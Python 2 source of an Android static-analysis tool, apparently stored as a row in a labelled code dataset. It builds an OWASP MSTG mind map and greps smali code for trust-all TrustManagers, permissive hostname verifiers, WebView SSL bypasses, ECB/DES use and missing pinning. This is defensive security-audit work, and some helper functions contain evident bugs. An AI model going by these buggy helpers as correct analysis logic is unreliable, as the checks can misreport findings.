                self.createSubTopics(customCertificatePinningTopic,self.app.smaliChecks.getCustomCertificatePinningLocations())
                certificatePinningTopic.addSubTopic(customCertificatePinningTopic)
        else:
            certificatePinningTopic.setTitle(""No usage of Certificate Pinning"")
            certificatePinningTopic.addMarker('flag-yellow')
        topicElement.getSubTopicByIndex(0).addSubTopic(certificatePinningTopic)






        sslImplementationTopic = topicElement.getSubTopicByIndex(0)
        sslImplementationTopic.getSubTopicByIndex(0).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#verifying-the-server-certificate"")
        sslImplementationTopic.getSubTopicByIndex(1).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#hostname-verification#hostname-verification"")
        sslImplementationTopic.getSubTopicByIndex(2).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#testing-custom-certificate-stores-and-certificate-pinning"")
        methodologyTopic.addSubTopic(topicElement)


        # Insecure Data Storage Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Insecure Data Storage"")
        idsSubTopics = [""Sensitive information stored in cleartext in sdcard/sandbox?""
                        ,""Sensitive information saved to system logs?""
                        ,""Background screenshot with sensitive information?""]
        self.createSubTopics(topicElement ,idsSubTopics)


        activitiesWithoutSecureFlagSubTopic = TopicElement()
        activitiesWithoutSecureFlagSubTopic.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05d-Testing-Data-Storage.md#finding-sensitive-information-in-auto-generated-screenshots"")
        if len(self.app.getActivitiesWithoutSecureFlag()) != 0:
            activitiesWithoutSecureFlagSubTopic.setTitle(""Activities without FLAG_SECURE or android:excludeFromRecents :"")
            activitiesWithoutSecureFlagSubTopic.addMarker('flag-yellow')
            self.createSubTopics(activitiesWithoutSecureFlagSubTopic, self.app.getActivitiesWithoutSecureFlag())
            activitiesWithoutSecureFlagSubTopic.setFolded()
            if len(self.app.getActivitiesWithoutSecureFlag()) > self.configuration.getXmindTopipFoldAt():
                activitiesWithoutSecureFlagSubTopic.setFolded()
        else:
            activitiesWithoutSecureFlagSubTopic.setTitle(""All activities have FLAG_SECURE or android:excludeFromRecents."")
            activitiesWithoutSecureFlagSubTopic.addMarker('flag-green')
        topicElement.addSubTopic(activitiesWithoutSecureFlagSubTopic)



        topicElement.getSubTopicByIndex(0).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05d-Testing-Data-Storage.md#testing-local-storage-for-sensitive-data"")
        topicElement.getSubTopicByIndex(1).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05d-Testing-Data-Storage.md#testing-logs-for-sensitive-data"")
        topicElement.getSubTopicByIndex(2).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05d-Testing-Data-Storage.md#finding-sensitive-information-in-auto-generated-screenshots"")
        methodologyTopic.addSubTopic(topicElement)


        # Insufficient Cryptography Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Insufficient Cryptography"")
        icrSubTopics = [""Using weak algorithms/modes?"" ,""Using hardcoded properties?""]
        self.createSubTopics(topicElement ,icrSubTopics)
        topicElement.getSubTopicByIndex(0).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x04g-Testing-Cryptography.md#identifying-insecure-andor-deprecated-cryptographic-algorithms"")
        topicElement.getSubTopicByIndex(1).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05e-Testing-Cryptography.md#verifying-the-configuration-of-cryptographic-standard-algorithms"")
        AESTopic = TopicElement()
        AESTopic.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x04g-Testing-Cryptography.md#identifying-insecure-andor-deprecated-cryptographic-algorithms"")
        if len(self.app.smaliChecks.getAESwithECBLocations()) > 0:
            AESTopic.setTitle(""Usage of AES with ECB Mode"")
            self.createSubTopics(AESTopic,self.app.smaliChecks.getAESwithECBLocations())
            AESTopic.addMarker('flag-red')
        else:
            AESTopic.setTitle(""No usage of AES with ECB Mode"")
            AESTopic.addMarker('flag-green')
        topicElement.addSubTopic(AESTopic)
        DESTopic = TopicElement()
        DESTopic.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x04g-Testing-Cryptography.md#identifying-insecure-andor-deprecated-cryptographic-algorithms"")
        if len(self.app.smaliChecks.getDESLocations()) > 0:
            DESTopic.setTitle(""Usage of DES or 3DES"")
            self.createSubTopics(DESTopic,self.app.smaliChecks.getDESLocations())
            DESTopic.addMarker('flag-red')
        else:
            DESTopic.setTitle(""No usage of DES or 3DES"")
            DESTopic.addMarker('flag-green')
        topicElement.addSubTopic(DESTopic)

        keystoreTopic = TopicElement()
        if len(self.app.smaliChecks.getKeystoreLocations()) > 0:
            keystoreTopic.setTitle(""Usage of Android KeyStore"")
            keystoreTopic.addMarker('flag-green')
            self.createSubTopics(keystoreTopic,self.app.smaliChecks.getKeystoreLocations())
        else:
            keystoreTopic.setTitle(""No usage of Android KeyStore"")
            keystoreTopic.addMarker('flag-yellow')
        topicElement.addSubTopic(keystoreTopic)



        methodologyTopic.addSubTopic(topicElement)


        # Code Tampering Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Code Tampering"")
        ctSubTopics = [""Lack of root detection?"" ,""Lack of hooking detection?""]
        self.createSubTopics(topicElement ,ctSubTopics)
        topicElement.getSubTopicByIndex(0).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05j-Testing-Resiliency-Against-Reverse-Engineering.md#testing-root-detection"")
        topicElement.getSubTopicByIndex(1).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05j-Testing-Resiliency-Against-Reverse-Engineering.md#testing-detection-of-reverse-engineering-tools"")
        methodologyTopic.addSubTopic(topicElement)

        # Reverse Engineering Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Reverse Engineering"")
        reSubTopics = [""Lack of code obfuscation?""]
        self.createSubTopics(topicElement ,reSubTopics)
        topicElement.getSubTopicByIndex(0).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05j-Testing-Resiliency-Against-Reverse-Engineering.md#testing-obfuscation"")
        methodologyTopic.addSubTopic(topicElement)

        self.getRootTopic().addSubTopic(informationGatheringTopic)
        self.getRootTopic().addSubTopic(methodologyTopic)

    def createSubTopics(self ,topic ,subTopics):
        for subtopic in subTopics:
            newTopic = TopicElement()
            newTopic.setTitle(subtopic)
            topic.addSubTopic(newTopic)

    def save(self):
        cwd = os.path.dirname(os.path.realpath(__file__))
        filename = self.app.getPackageName( ) +"".xmind""
        xmind.save(self.workbook ,cwd+""/output_xmind/""+filename)
        print ""Generated output_xmind/"" +filename
/n/n/nSmaliChecks.py/n/nimport re
from Configuration import *
from subprocess import *
from sys import platform


class NotFound(Exception):
    """"""Object not found in source code""""""

class SmaliChecks:

    smaliPaths = []
    vulnerableTrustManagers=[]
    vulnerableWebViewSSLErrorBypass=[]
    vulnerableSetHostnameVerifiers = []
    vulnerableHostnameVerifiers = []
    vulnerableSocketsLocations = []
    vulnerableContentProvidersSQLiLocations = []
    vulnerableContentProvidersPathTraversalLocations = []
    dynamicRegisteredBroadcastReceiversLocations = []
    encryptionFunctionsLocation = []
    decryptionFunctionsLocation = []
    undeterminedCryptographicFunctionsLocation = []
    keystoreLocations = []
    webViewLoadUrlUsageLocation = []
    webViewAddJavascriptInterfaceUsageLocation = []
    okHttpCertificatePinningLocation = []
    customCertifificatePinningLocation = []
    AESwithECBLocations = []
    DESLocations =[]
    javascriptEnabledWebviews = []
    fileAccessEnabledWebviews = []
    universalAccessFromFileURLEnabledWebviewsLocations = []
    customChecksLocations = {}
    configuration = Configuration()

    def __init__(self, paths):
        for path in paths:
            self.smaliPaths.append(path)
        self.checkWebviewSSLErrorBypass()
        self.findWebviewJavascriptInterfaceUsage()
        self.findWeakCryptographicUsage()
        self.checkVulnerableTrustManagers()
        self.checkInsecureHostnameVerifier()
        self.checkVulnerableSockets()
        self.findEncryptionFunctions()
        self.checkVulnerableHostnameVerifiers()
        self.findWebViewLoadUrlUsage()
        self.findCustomChecks()
        self.findPropertyEnabledWebViews()
        self.checkOKHttpCertificatePinning()
        self.checkCustomPinningImplementation()
        self.findKeystoreUsage()
        self.findDynamicRegisteredBroadcastReceivers()
        self.findPathTraversalContentProvider()

    def getSmaliPaths(self):
        return self.smaliPaths

    def getOSGnuGrepCommand(self):
        if platform == ""darwin"":
            return ""ggrep""
        else:
            return ""grep""


    def checkForExistenceInFolder(self,objectRegEx,folderPath):
        command = [self.getOSGnuGrepCommand(),""-s"" ,""-r"", ""-l"", ""-P"",objectRegEx,"" --exclude-dir=""+self.configuration.getFolderExclusions()]
        for path in folderPath:
            command.append(path)
        grep = Popen(command, stdout=PIPE)
        filePaths = grep.communicate()[0].strip().split('\n')
        if len(filePaths) > 0:
            return filePaths
        else:
            raise NotFound

    def existsInFile(self,objectRegEx,filePath):
        grep = Popen([self.getOSGnuGrepCommand(),""-l"", ""-P"",objectRegEx,filePath], stdout=PIPE)
        filePaths = grep.communicate()[0].strip().split('\n')
        if len(filePaths) > 0:
            return filePaths
        else:
            return False

    def getMethodCompleteInstructions(self,methodRegEx,filePath):
        sed = Popen([""sed"", ""-n"", methodRegEx, filePath], stdout=PIPE)
        methodContent = sed.communicate()[0]
        return methodContent.strip().replace('    ','').split('\n')

    def getFileContent(self,filePath):
        sed = Popen([""sed"", ""1p"",filePath], stdout=PIPE)
        fileContent = sed.communicate()[0]
        return fileContent.strip().replace('    ', '').split('\n')

    def getMethodInstructions(self,methodRegEx,filePath):
        sed = Popen([""sed"", ""-n"", methodRegEx, filePath], stdout=PIPE)
        methodContent = sed.communicate()[0]
        try:
            match = re.search(r"".locals \d{1,}([\S\s]*?).end method"", methodContent)
            instructions = str(match.group(1)).strip().replace('    ','').split('\n')
            return instructions
        except:
            return """"

    def isMethodEmpty(self,instructions):
        for i in range(len(instructions)-1,0,-1):
            if instructions[i] == '.end method':
                continue
            else:
                if instructions[i] == ""return-void"":
                    return True
                else:
                    return False

    def hasOperationProceed(self,instructions):
        for i in range(len(instructions) - 1, 0, -1):
            if 'Landroid/webkit/SslErrorHandler;->proceed()V' in instructions[i]:
                return True
            else:
                continue
        return False

    def doesMethodReturnNull(self,instructions):
        for i in range(len(instructions) - 1, 0, -1):
            if instructions[i] == ""return-object v0"":
                if i-2 >= 0  and instructions[i-2] == ""const/4 v0, 0x0"":
                    return True
                elif i-2 >=0 and instructions[i-2] == ""new-array v0, v0, [Ljava/security/cert/X509Certificate;"":
                    if i-4 >= 0 and instructions[i - 4] == ""const/4 v0, 0x0"":
                        return True
                    else:
                        return False
                else:
                    return False
            else:
                continue
        return False

    def doesMethodReturnTrue(self,instructions):
        maxLen = len(instructions)-1
        for i in range(maxLen, 0, -1):
            if instructions[i] == ""return v0"":
                if i-2 >= 0 and instructions[i-2] == ""const/4 v0, 0x1"":
                    return True
                else:
                    return False
            else:
                continue
        return False


    #Returns the register that has the target value assigned

    def searchRegisterByAssignedValue(self,instructions,value):
        register = """"
        for instruction in instructions:
            if ""const/"" in instruction and value in instruction:
                registerEnd = instruction.find("","")
                registerBegin = instruction.find("" "",0,registerEnd)+1
                register = instruction[registerBegin:registerEnd]
                break
        return register


    #Returns the assigned value to the targer register.

    def getAssignedValueByRegister(self,instructions,register):
        register = """"
        for instruction in instructions:
            if ""const/"" in instruction and register in instruction:
                registerEnd = instruction.find("","")
                registerBegin = instruction.find("" "",0,registerEnd)+1
                register = instruction[registerBegin:registerEnd]
                break
        return register


    def doesActivityExtendsPreferenceActivity(self,activity):
        activity = activity.replace(""."",""/"")
        activityLocation = self.checkForExistenceInFolder("".class public([a-zA-Z\s]*)L""+activity+"";"",self.getSmaliPaths())
        if activityLocation[0] != """":
            preferenceExtends = self.existsInFile("".super Landroid\/preference\/PreferenceActivity;"",activityLocation[0])
            if preferenceExtends[0] != '':
                return True
            else:
                return False

    def doesPreferenceActivityHasValidFragmentCheck(self,activity):
        activity = activity.replace(""."",""/"")
        activityLocation = self.checkForExistenceInFolder("".class public([a-zA-Z\s]*)L""+activity+"";"",self.getSmaliPaths())
        if activityLocation[0] != """":
            isValidFragmentFunction = self.getMethodCompleteInstructions('/.method protected isValidFragment(Ljava\/lang\/String;)Z/,/^.end method/p',activityLocation[0])
            if isValidFragmentFunction[0] != '':
                return True
            else:
                return False

    def doesActivityHasFlagSecure(self,activity):
        activity = activity.replace(""."",""/"")
	end = activity.rfind('/')+1
	customPath = []
        x = len(self.getSmaliPaths())
	for a in range(0,x):
		customPath.append(self.getSmaliPaths()[a]+activity[:end])
        activityLocation = self.checkForExistenceInFolder("".class public([a-zA-Z\s]*)L""+activity+"";"",customPath)
        if activityLocation[0] != """":
            methodInstructions = self.getMethodCompleteInstructions('/.method \([a-zA-Z]* \)onCreate(Landroid\/os\/Bundle;)V/,/^.end method/p',activityLocation[0])
            register = self.searchRegisterByAssignedValue(methodInstructions,""0x2000"")
            if register.strip() == """":
		        return False
            else:
                flag = self.existsInFile(""invoke-virtual.*""+register+"".*Landroid\/view\/Window;->setFlags\(II\)V"",activityLocation[0])
                if flag[0] != '':
                    return True
                else:
                    return False

    def findRegisterAssignedValueFromIndexBackwards(self,instructionsList,register,index):
        for pointer in range(index,0,-1):
            if register in instructionsList[pointer] and (""const"" in instructionsList[pointer] or ""sget-object"" in instructionsList[pointer]):
                valueBegin = instructionsList[pointer].find("","")
                value = instructionsList[pointer][valueBegin+2:]
                return value

    def findRegistersPassedToFunction(self,functionInstruction):
        match = re.search(r""{(.*)}"", functionInstruction)
        try:
            if ""range"" in functionInstruction:
                registers = str(match.group(1)).strip().replace(' ', '').split("".."")
            else:
                registers = str(match.group(1)).strip().replace(' ','').split("","")
        except:
            match = re.search(r""\D\d"", functionInstruction)
            try:
                registers = str(match.group(0))
            except:
                return """"
        return registers

    def findInstructionIndex(self,instructionsList,instructionToSearch):
        indexList = []
        for index,instruction in enumerate(instructionsList):
            m = re.search(instructionToSearch,instruction)
            try:
                output = m.group(0)
                indexList.append(index)
            except:
                continue
        return indexList



    def findDynamicRegisteredBroadcastReceivers(self):
        dynamicRegisteredBroadcastReceiversLocations = self.checkForExistenceInFolder(
            "";->registerReceiver\(Landroid\/content\/BroadcastReceiver;Landroid\/content\/IntentFilter;\)"",
            self.getSmaliPaths())
        for location in dynamicRegisteredBroadcastReceiversLocations:
            self.dynamicRegisteredBroadcastReceiversLocations.append(location)


    def findEncryptionFunctions(self):
        encryptionFunctionsLocations = self.checkForExistenceInFolder(""invoke-virtual {(.*)}, Ljavax\/crypto\/Cipher;->init\(ILjava\/security\/Key"",self.getSmaliPaths())
        if encryptionFunctionsLocations[0] != """":
            for location in encryptionFunctionsLocations:
                if ""org/bouncycastle"" in location:
                    continue
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Ljavax/crypto/Cipher;->init\(ILjava/security/Key"")
                if len(indexList) != 0:
                    for index in indexList:
                        registers = self.findRegistersPassedToFunction(instructions[index])
                        if self.findRegisterAssignedValueFromIndexBackwards(instructions,registers[1],index) == ""0x1"":
                            self.encryptionFunctionsLocation.append(location)
                        elif self.findRegisterAssignedValueFromIndexBackwards(instructions,registers[1],index) == ""0x2"":
                            self.decryptionFunctionsLocation.append(location)
                        else:
                            if location not in self.undeterminedCryptographicFunctionsLocation:
                                self.undeterminedCryptographicFunctionsLocation.append(location)

    def findKeystoreUsage(self):
        keystoreUsageLocations = self.checkForExistenceInFolder(""invoke-virtual {(.*)}, Ljava\/security\/KeyStore;->getEntry\(Ljava\/lang\/String;Ljava\/security\/KeyStore\$ProtectionParameter;\)Ljava\/security\/KeyStore\$Entry"",self.getSmaliPaths())
        if keystoreUsageLocations[0] != """":
            for location in keystoreUsageLocations:
                self.keystoreLocations.append(location)

    def findWebViewLoadUrlUsage(self):
        webViewUsageLocations = self.checkForExistenceInFolder(""Landroid\/webkit\/WebView;->loadUrl\(Ljava\/lang\/String;\)V"",self.getSmaliPaths())
        if webViewUsageLocations[0] != """":
            for location in webViewUsageLocations:
                self.webViewLoadUrlUsageLocation.append(location)


    # *** Improper Platform Usage ***

    def findPathTraversalContentProvider(self):
        contentProvidersLocations = self.checkForExistenceInFolder("".super Landroid\/content\/ContentProvider;"",self.getSmaliPaths())
        if contentProvidersLocations[0] != '':
            for location in contentProvidersLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"""")
                if len(indexList) > 0:
                    indexList = self.findInstructionIndex(instructions,"""")

    def determineContentProviderPathTraversal(self,provider):
        location = self.checkForExistenceInFolder("".class .* L""+provider.replace(""."",""/""),self.getSmaliPaths())
        instructions = self.getMethodCompleteInstructions('/.method public openFile(Landroid\/net\/Uri;Ljava\/lang\/String;)Landroid\/os\/ParcelFileDescriptor;/,/^.end method/p', location[0])
        indexList = self.findInstructionIndex(instructions,""Ljava\/io\/File;->getCanonicalPath\(\)"")
        if len(indexList) > 0:
                self.vulnerableContentProvidersPathTraversalLocations.append(location[0])


    def determineContentProviderSQLi(self,provider):
        location = self.checkForExistenceInFolder("".class .* L""+provider.replace(""."",""/""),self.getSmaliPaths())
        instructions = self.getMethodCompleteInstructions('/.method public query(Landroid\/net\/Uri;\[Ljava\/lang\/String;Ljava\/lang\/String;\[Ljava\/lang\/String;Ljava\/lang\/String;)Landroid\/database\/Cursor;/,/^.end method/p', location[0])
        indexList = self.findInstructionIndex(instructions,""invoke-virtual(.*) {(.*)}, Landroid\/database\/sqlite\/SQLiteDatabase;->query"")
        if len(indexList) > 0:
            indexList = self.findInstructionIndex(instructions,""\?"")
            if len(indexList) == 0:
                self.vulnerableContentProvidersSQLiLocations.append(location[0])



    def findWeakCryptographicUsage(self):
        getInstanceLocations = self.checkForExistenceInFolder(""Ljavax\/crypto\/Cipher;->getInstance\(Ljava\/lang\/String;\)Ljavax\/crypto\/Cipher;"",self.getSmaliPaths())
        if getInstanceLocations[0] != '':
            for location in getInstanceLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Ljavax/crypto/Cipher;->getInstance\(Ljava/lang/String;\)Ljavax/crypto/Cipher;"")
                for index in indexList:
		    register = self.findRegistersPassedToFunction(instructions[index])
                    transformationValue = self.findRegisterAssignedValueFromIndexBackwards(instructions, register[0], index)
                    if transformationValue is not None:
                        if transformationValue == ""\""AES\"""" or ""AES/ECB/"" in transformationValue:
                            self.AESwithECBLocations.append(location)
                        elif ""DES"" in transformationValue:
                            self.DESLocations.append(location)


    def findPropertyEnabledWebViews(self):
        webviewUsageLocations = self.checkForExistenceInFolder("";->getSettings\(\)Landroid\/webkit\/WebSettings;"",self.getSmaliPaths())
        if webviewUsageLocations[0] != '':
            for location in webviewUsageLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Landroid/webkit/WebSettings;->setJavaScriptEnabled\(Z\)V"")
                if len(indexList) > 0:
                    for index in indexList:
                        register = self.findRegistersPassedToFunction(instructions[index])
                        value = self.findRegisterAssignedValueFromIndexBackwards(instructions,register[1],index)
                        if value == ""0x1"":
                            self.javascriptEnabledWebviews.append(location)
                indexList = self.findInstructionIndex(instructions,""Landroid/webkit/WebSettings;->setAllowFileAccess\(Z\)V"")
                if len(indexList) > 0:
                    for index in indexList:
                        register = self.findRegistersPassedToFunction(instructions[index])
                        value = self.findRegisterAssignedValueFromIndexBackwards(instructions, register[1], index)
                        if value == ""0x1"":
                            self.fileAccessEnabledWebviews.append(location)
                else:
                    self.fileAccessEnabledWebviews.append(location)
                indexList = self.findInstructionIndex(instructions,""Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs\(Z\)V"")
                if len(indexList) > 0:
                    for index in indexList:
                        register = self.findRegistersPassedToFunction(instructions[index])
                        value = self.findRegisterAssignedValueFromIndexBackwards(instructions, register[1], index)
                        if value == ""0x1"":
                            self.universalAccessFromFileURLEnabledWebviewsLocations.append(location)



    def findWebviewJavascriptInterfaceUsage(self):
        javascriptInterfaceLocations = self.checkForExistenceInFolder("";->addJavascriptInterface\(Ljava\/lang\/Object;Ljava\/lang\/String;\)V"",self.getSmaliPaths())
        if javascriptInterfaceLocations[0] != '':
            for location in javascriptInterfaceLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"";->addJavascriptInterface\(Ljava/lang/Object;Ljava/lang/String;\)V"")
                if len(indexList) != 0:
                    for index in indexList:
                        registers = self.findRegistersPassedToFunction(instructions[index])
                    self.webViewAddJavascriptInterfaceUsageLocation.append(location)


    # *** Insecure Communication Checks ***

    #Check for the implementation of custom HostnameVerifiers

    def checkInsecureHostnameVerifier(self):
        insecureHostNameVerifierLocations = self.checkForExistenceInFolder("".implements Ljavax\/net\/ssl\/HostnameVerifier;"",self.getSmaliPaths())
        if insecureHostNameVerifierLocations[0] != '':
            for location in insecureHostNameVerifierLocations:
                methodInstructions = self.getMethodCompleteInstructions('/.method .* verify(Ljava\/lang\/String;Ljavax\/net\/ssl\/SSLSession;)Z/,/^.end method/p',location)
                if methodInstructions != """":
                    if self.doesMethodReturnTrue(methodInstructions) == True:
                        self.vulnerableHostnameVerifiers.append(location)

    #Check for the presence of the custom function that allows to bypass SSL errors in WebViews

    def checkWebviewSSLErrorBypass(self):
        webviewErrorBypassLocations = self.checkForExistenceInFolder(""Landroid\/webkit\/SslErrorHandler;->proceed\(\)V"",self.getSmaliPaths())
        if webviewErrorBypassLocations[0] != '':
            for location in webviewErrorBypassLocations:
                self.vulnerableWebViewSSLErrorBypass.append(location)

    #Check for the presence of custom TrustManagers that are vulnerable.

    def checkVulnerableTrustManagers(self):
        vulnerableTrustManagers = []
        try:
            checkClientTrustedLocations = self.checkForExistenceInFolder("".method public checkClientTrusted\(\[Ljava\/security\/cert\/X509Certificate;Ljava\/lang\/String;\)V"",self.getSmaliPaths())
            if checkClientTrustedLocations[0] != '':
                for location in checkClientTrustedLocations:
                    methodInstructions = self.getMethodCompleteInstructions('/method public checkClientTrusted\(\)/,/^.end method/p',location)
                    if methodInstructions != """":
                        if self.isMethodEmpty(methodInstructions) == True:
                            getAcceptedIssuersLocations = self.existsInFile("".method public getAcceptedIssuers\(\)\[Ljava\/security\/cert\/X509Certificate;"",location)
                            if methodInstructions != """":
                                methodInstructions = self.getMethodCompleteInstructions('/method public getAcceptedIssuers()\[Ljava\/security\/cert\/X509Certificate;/,/^.end method/p',getAcceptedIssuersLocations[0])
                                if self.doesMethodReturnNull(methodInstructions) == True:
                                    checkServerTrustedLocations = self.existsInFile("".method public checkServerTrusted\(\[Ljava\/security\/cert\/X509Certificate;Ljava\/lang\/String;\)V"",location)
                                    if methodInstructions != """":
                                        methodInstructions = self.getMethodCompleteInstructions('/method public checkServerTrusted\(\)/,/^.end method/p', checkServerTrustedLocations[0])
                                        if self.isMethodEmpty(methodInstructions) == True:
                                            vulnerableTrustManagers.append(location)
                                            self.vulnerableTrustManagers.append(location)
                return vulnerableTrustManagers
        except NotFound:
            pass

    #Check for the presence of setHostnameVerifier with ALLOW_ALL_HOSTNAME_VERIFIER

    def checkVulnerableHostnameVerifiers(self):
        setHostnameVerifierLocations = self.checkForExistenceInFolder(""invoke-virtual {(.*)}, Lorg\/apache\/http\/conn\/ssl\/SSLSocketFactory;->setHostnameVerifier\(Lorg\/apache\/http\/conn\/ssl\/X509HostnameVerifier;\)V"",self.getSmaliPaths())
        if setHostnameVerifierLocations[0] != """":
            for location in setHostnameVerifierLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Lorg/apache/http/conn/ssl/SSLSocketFactory;->setHostnameVerifier"")
                if len(indexList) != 0:
                    for index in indexList:
                        registers = self.findRegistersPassedToFunction(instructions[index])
                        if self.findRegisterAssignedValueFromIndexBackwards(instructions, registers[1], index) == ""Lorg/apache/http/conn/ssl/SSLSocketFactory;->ALLOW_ALL_HOSTNAME_VERIFIER:Lorg/apache/http/conn/ssl/X509HostnameVerifier;"":
                            self.vulnerableSetHostnameVerifiers.append(location)

    #Check for SocketFactory without Hostname Verify

    def checkVulnerableSockets(self):
        vulnerableSocketsLocations = self.checkForExistenceInFolder(""Ljavax\/net\/SocketFactory;->createSocket\(Ljava\/lang\/String;I\)Ljava\/net\/Socket;"",self.getSmaliPaths())
        if vulnerableSocketsLocations[0] != """":
            for location in vulnerableSocketsLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Ljavax/net/ssl/HostnameVerifier;->verify\(Ljava/lang/String;Ljavax/net/ssl/SSLSession;\)Z"")
                if len(indexList) == 0:
                    self.vulnerableSocketsLocations.append(location)

    #Check for the implementation of OKHttp Certificate Pinning

    def checkOKHttpCertificatePinning(self):
        okHttpCertificatePinningLocations = self.checkForExistenceInFolder(""add\(Ljava\/lang\/String;\[Ljava\/lang\/String;\)Lokhttp3\/CertificatePinner\$Builder"",self.getSmaliPaths())
        if okHttpCertificatePinningLocations[0] != '':
            for location in okHttpCertificatePinningLocations:
                #Bypass library files
                if ""/okhttp"" in location:
                    continue
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""certificatePinner\(Lokhttp3/CertificatePinner;\)Lokhttp3/OkHttpClient$Builder;"")
                if len(indexList) == 0:
                    self.okHttpCertificatePinningLocation.append(location)

    #Check for custom Certificate Pinning Implementation

    def checkCustomPinningImplementation(self):
        customCertificatePinningLocations = self.checkForExistenceInFolder(""invoke-virtual {(.*)}, Ljavax\/net\/ssl\/TrustManagerFactory;->init\(Ljava\/security\/KeyStore;\)V"",self.getSmaliPaths())
        if customCertificatePinningLocations[0] != '':
            for location in customCertificatePinningLocations:
                if ""/okhttp"" in location or ""io/fabric"" in location:
                    continue
                self.customCertifificatePinningLocation.append(location)


    # *** CUSTOM CHECKS ***


    def findCustomChecks(self):
        for check in self.configuration.getCustomChecks():
                self.customChecksLocations[check[0]] = []
                customCheckLocationsFound = self.checkForExistenceInFolder(check[1],self.getSmaliPaths())
                if customCheckLocationsFound[0] != '':
                    for location in customCheckLocationsFound:
                        self.customChecksLocations[check[0]].append(location)
    # *** GETTERS ***

    def getVulnerableTrustManagers(self):
        return self.vulnerableTrustManagers

    def getVulnerableWebViewSSLErrorBypass(self):
        return self.vulnerableWebViewSSLErrorBypass

    def getVulnerableHostnameVerifiers(self):
        return self.vulnerableHostnameVerifiers

    def getEncryptionFunctionsLocations(self):
        return self.encryptionFunctionsLocation

    def getDecryptionFunctionsLocations(self):
        return self.decryptionFunctionsLocation

    def getUndeterminedCryptographicFunctionsLocations(self):
        return self.undeterminedCryptographicFunctionsLocation

    def getVulnerableSetHostnameVerifier(self):
        return self.vulnerableSetHostnameVerifiers

    def getVulnerableSockets(self):
        return self.vulnerableSocketsLocations

    def getWebViewsLoadUrlUsageLocations(self):
        return self.webViewLoadUrlUsageLocation

    def getCustomChecksLocations(self):
        return self.customChecksLocations

    def getWebviewAddJavascriptInterfaceLocations(self):
        return self.webViewAddJavascriptInterfaceUsageLocation

    def getAESwithECBLocations(self):
        return self.AESwithECBLocations

    def getDESLocations(self):
        return self.DESLocations

    def getJavascriptEnabledWebViews(self):
        return self.javascriptEnabledWebviews

    def getFileAccessEnabledWebViews(self):
        return self.fileAccessEnabledWebviews

    def getUniversalAccessFromFileURLEnabledWebviewsLocations(self):
        return self.universalAccessFromFileURLEnabledWebviewsLocations

    def getOkHTTPCertificatePinningLocations(self):
        return self.okHttpCertificatePinningLocation

    def getCustomCertificatePinningLocations(self):
        return self.customCertifificatePinningLocation

    def getKeystoreLocations(self):
        return self.keystoreLocations

    def getDynamicRegisteredBroadcastReceiversLocations(self):
        return self.dynamicRegisteredBroadcastReceiversLocations

    def getVulnerableContentProvidersSQLiLocations(self):
        return self.vulnerableContentProvidersSQLiLocations

    def getVulnerableContentProvidersPathTraversalLocations(self):
        return self.vulnerableContentProvidersPathTraversalLocations/n/n/n",0
215,02256eedb8fecc60376f35d2f772e9bc275c5574,"/SmaliChecks.py/n/nimport re
from Configuration import *
from subprocess import *
from sys import platform


class NotFound(Exception):
    """"""Object not found in source code""""""

class SmaliChecks:

    smaliPaths = []
    vulnerableTrustManagers=[]
    vulnerableWebViewSSLErrorBypass=[]
    vulnerableSetHostnameVerifiers = []
    vulnerableHostnameVerifiers = []
    vulnerableSocketsLocations = []
    dynamicRegisteredBroadcastReceiversLocations = []
    encryptionFunctionsLocation = []
    decryptionFunctionsLocation = []
    undeterminedCryptographicFunctionsLocation = []
    keystoreLocations = []
    webViewLoadUrlUsageLocation = []
    webViewAddJavascriptInterfaceUsageLocation = []
    okHttpCertificatePinningLocation = []
    customCertifificatePinningLocation = []
    AESwithECBLocations = []
    DESLocations =[]
    javascriptEnabledWebviews = []
    fileAccessEnabledWebviews = []
    universalAccessFromFileURLEnabledWebviewsLocations = []
    customChecksLocations = {}
    configuration = Configuration()

    def __init__(self, paths):
        for path in paths:
            self.smaliPaths.append(path)
        self.checkWebviewSSLErrorBypass()
        self.findWebviewJavascriptInterfaceUsage()
        self.findWeakCryptographicUsage()
        self.checkVulnerableTrustManagers()
        self.checkInsecureHostnameVerifier()
        self.checkVulnerableSockets()
        self.findEncryptionFunctions()
        self.checkVulnerableHostnameVerifiers()
        self.findWebViewLoadUrlUsage()
        self.findCustomChecks()
        self.findPropertyEnabledWebViews()
        self.checkOKHttpCertificatePinning()
        self.checkCustomPinningImplementation()
        self.findKeystoreUsage()
        self.findDynamicRegisteredBroadcastReceivers()
        self.findPathTraversalContentProvider()

    def getSmaliPaths(self):
        return self.smaliPaths

